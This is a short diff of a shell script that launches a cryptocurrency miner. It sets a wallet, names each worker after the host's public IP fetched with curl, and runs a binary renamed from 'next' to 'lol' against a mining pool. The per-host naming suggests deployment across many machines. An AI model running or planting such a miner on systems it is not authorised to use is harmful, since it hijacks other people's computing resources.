@@ -4,5 +4,5 @@ WALLET=3K58rk4hAySW78RPaxkzFVhddAL7iMxkbZ
 WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )
 
 cd "$(dirname "$0")"
-chmod +x next
-./next --algo DaggerHashimoto --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
+chmod +x lol
+./lol --algo DaggerHashimoto --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
